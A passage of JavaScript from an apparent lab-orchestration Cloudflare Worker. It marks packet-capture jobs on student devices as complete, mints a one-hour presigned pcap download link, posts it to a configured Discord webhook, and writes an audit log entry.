//       tailscale ssh root@drop-<student> 'sh /tmp/run-capture.sh <job_id> 30'
//   - Mango runs tcpdump-mini, uploads pcap, calls PATCH /v1/jobs/<id>/complete
// This is documented in Lab 14 README.
// ---------------------------------------------------------------------------

async function handleJobCompletion(pathname, request, env) {
    if (request.method !== 'PATCH' && request.method !== 'POST') {
        return new Response('Method Not Allowed', { status: 405 });
    }

    // Extract job_id from /v1/jobs/<job_id>/complete
    const parts = pathname.split('/');
    const jobId = parts[3]; // [0]="" [1]="v1" [2]="jobs" [3]="<id>" [4]="complete"
    if (!jobId) {
        return Response.json({ error: 'Missing job ID in path' }, { status: 400 });
    }

    let body = {};
    try {
        body = await request.json();
    } catch {
        return Response.json({ error: 'Invalid JSON body' }, { status: 400 });
    }

    const { artifact_id, device_id, exit_code = 0, duration_s } = body;

    // 1. Load existing job from KV
    let job = null;
    try {
        const raw = await env.RATE_LIMITS.get(`job:${jobId}`);
        if (raw) job = safeJsonParse(raw, null);
    } catch (err) {
        console.error('handleJobCompletion: KV read error:', err);
    }

    // 2. Update job status in KV
    const updatedJob = {
        ...(job || { job_id: jobId, device_id: device_id || 'unknown', command: 'capture' }),
        status: exit_code === 0 ? 'complete' : 'failed',
        artifact_id: artifact_id || null,
        exit_code,
        duration_s: duration_s || null,
        completed_at: new Date().toISOString(),
    };
    try {
        await env.RATE_LIMITS.put(`job:${jobId}`, JSON.stringify(updatedJob), {
            expirationTtl: 3600, // keep for 1 hour post-completion
        });
    } catch (err) {
        console.error('handleJobCompletion: KV write error:', err);
    }

    // 3. Mint a signed download URL for the artifact
    let downloadUrl = null;
    if (artifact_id && env.ARTIFACTS) {
        try {
            const expiresIn = 3600;
            downloadUrl = await env.ARTIFACTS.createPresignedUrl(artifact_id, 'GET', { expiresIn });
        } catch (err) {
            console.error('handleJobCompletion: presigned URL error:', err);
        }
    }

    // 4. Post signed URL back to Discord webhook
    if (downloadUrl && env.DISCORD_WEBHOOK_URL) {
        try {
            const discordPayload = {
                content: [
                    `Capture complete for job \`${jobId}\``,
                    `Device: \`${device_id || 'unknown'}\``,
                    `Duration: ${duration_s ? duration_s + 's' : 'unknown'}`,
                    `Download pcap (1 hour): ${downloadUrl}`,
                ].join('\n'),
            };
            await fetch(env.DISCORD_WEBHOOK_URL, {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify(discordPayload),
            });
        } catch (err) {
            console.error('handleJobCompletion: Discord webhook error (non-fatal):', err);
        }
    }

    // 5. Audit the full chain
    await logAudit(env, {
        operator_id: request.headers.get('CF-Access-Client-Id') || null,
        device_id:   device_id || job?.device_id || null,
        action:      'exec_finished',
        details: {
            job_id:      jobId,
            artifact_id,
            exit_code,
            duration_s,
            download_url: downloadUrl ? 'minted' : null,
            discord_notified: !!(downloadUrl && env.DISCORD_WEBHOOK_URL),
        },
        source_ip:  request.headers.get('CF-Connecting-IP'),
        user_agent: request.headers.get('User-Agent'),
    });

    return Response.json({
        job_id:       jobId,
        status:       updatedJob.status,
        artifact_id,
        download_url: downloadUrl,
    });
}
